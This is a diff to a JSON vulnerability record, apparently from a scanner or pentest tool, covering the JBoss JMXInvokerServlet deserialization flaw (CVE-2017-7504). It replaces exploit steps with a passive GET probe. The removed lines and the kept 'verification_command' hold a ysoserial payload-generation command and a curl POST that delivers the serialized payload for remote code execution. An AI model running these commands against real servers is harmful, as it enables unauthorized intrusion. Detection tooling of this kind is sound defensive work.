@@ -1,5 +1,6 @@
 {
   "vuln_id": "jboss_cve2017_7504",
+  "dispatch_skill": "jboss_deserial_rce",
   "description": "JBoss JMXInvokerServlet 反序列化漏洞，允许攻击者通过HTTP请求执行任意代码",
   "category": "java_deserialization",
   "cves": [
@@ -35,20 +36,22 @@
     "/web-console"
   ],
   "detection_method": "发送GET请求到 http://{TARGET}/invoker/JMXInvokerServlet，如果返回HTTP 200状态码且响应头包含 Content-Type: application/x-java-serialized-object，则可能存在漏洞",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "使用ysoserial生成反序列化payload",
-      "command": "java -jar ysoserial.jar CommonsCollections1 \"touch /tmp/test\" > payload.ser",
-      "expected_result": "生成payload.ser文件",
-      "notes": "需要ysoserial工具，可使用CommonsCollections1、CommonsCollections2等gadget链"
-    },
-    {
-      "step": 2,
-      "description": "发送payload到目标服务器",
-      "command": "curl -X POST --data-binary @payload.ser http://{TARGET}/invoker/JMXInvokerServlet -H \"Content-Type: application/x-java-serialized-object\"",
-      "expected_result": "返回HTTP 200状态码",
-      "notes": "如果成功执行，会在目标服务器上创建/tmp/test文件"
+      "id": "jboss_jmxinvoker_probe",
+      "description": "GET /invoker/JMXInvokerServlet，观察 java-serialized-object Content-Type",
+      "method": "GET",
+      "path": "/invoker/JMXInvokerServlet",
+      "timeout": 8,
+      "success_signs": {
+        "header_contains": [
+          [
+            "Content-Type",
+            "application/x-java-serialized-object"
+          ]
+        ]
+      },
+      "confidence": 0.9
     }
   ],
   "verification_command": "curl -X POST --data-binary @payload.ser http://{TARGET}/invoker/JMXInvokerServlet -H \"Content-Type: application/x-java-serialized-object\"",
